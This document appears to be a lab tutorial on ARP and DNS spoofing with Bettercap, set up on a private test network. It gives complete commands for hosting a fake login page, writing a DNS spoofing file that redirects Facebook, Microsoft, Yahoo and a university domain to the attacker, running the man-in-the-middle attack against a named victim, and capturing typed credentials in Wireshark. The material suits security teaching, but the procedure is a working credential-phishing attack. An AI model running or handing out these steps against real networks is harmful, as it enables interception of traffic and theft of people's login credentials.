
##    Bettercap - ARP/DNS Spoofing

https://www.youtube.com/watch?v=58_TeuJ8tPU

Network Configuration
```
--------------------         ------------------
|                  |---------|     Attacker   |
|      Router      |         |  192.168.1.10  |
|                  |         ------------------
|                  |         ------------------
|   192.168.1.1    |---------|     Victim     |
|                  |         |  192.168.1.15  |
--------------------         ------------------
```
1. Install Bettercap
```
# apt-get install build-essential ruby-dev libpcap-dev
# gem install bettercap
```
2. Create a simple 'Login Form' page

https://www.w3schools.com/howto/tryit.asp?filename=tryhow_css_login_form
```
# mv /var/www/html/index.html /var/www/html/index.html.old
# gedit /var/www/html/index.html
```
- Save this file

3. Start the Apache Web Server 

- These commands will start our web server on our Kali machine hosting the fake login page.
```
# service apache2 stop
# service apache2 start
```
- Testing the web server on our Kali machine...

Go to Web browser > http://localhost

4. Create the `hosts` file to perform DNS spoofing

- In a real life scenario, an attacker would redirect traffic to their own machine for data sniffing. In this case, we set up a simple login page, then we use Bettercap to spoof DNS record so that when the victim visits his favorite webpages, he will be redirected to the attacker machine instead. This will probably fool the user into entering their credentials.

- We need to create a `hosts` file which is responsible for redirecting specific DNS requests.
```
# gedit dns.conf
```
- Then add some lines as follows:
```
local .*ais\.ac\.nz
local .*facebook\.com
local .*microsoft\.com
local .*yahoo\.com
```
- Save this file

5. Using Bettercap to conduct DNS Spoofing

- Usage:
```
# sudo bettercap -I ethx -X --gateway GATEWAY --target TARGET --dns HOSTS_FILE
```
- Firstly for testing purpose, we need to clear the ARP cache on Kali machine
```
# ip -s -s neigh flush all
# ip link set arp off dev eth0; ip link set arp on dev eth0
```
- Then check the ARP cache again on Kali machine
```
# arp -n
```
- Then, we uses this command to conduct DNS Spoofing (remember select the right network interface)
```
# sudo bettercap -I eth0 -X --gateway 192.168.1.1 --target 192.168.1.15 --dns dns.conf
```
6. Check your test results

- Now every time the victim visits the webpages you indicated in the "dns.conf" file, he will be redirected to the malicious webpage.

- For testing purpose, we also need to purge the DNS resolver cache + Web browsing history on Victim machine
cmd> ipconfig /flushdns
IE / Firefox / Chrome > Clear Browsing Data

> Now it's time to check all my favorite websites 

- On Victim machine, go to AIS/Facebook/Microsoft websites

=> We can check the spoofed DNS records on the victim machine (Windows machine)
cmd> ipconfig /displaydns

=> We can also see the DNS records in Bettercap => ...Received request for 'xxxxxx.xxx', sending spoofed reply 192.168.1.10...

- Then try to login using the fake webpage...
```
* Username: AIS_Username
* Password: AIS_Password
```
=> Check traffic sniffed using Wireshark > apply this filter string
```
ip.addr == 192.168.1.15 && http
```
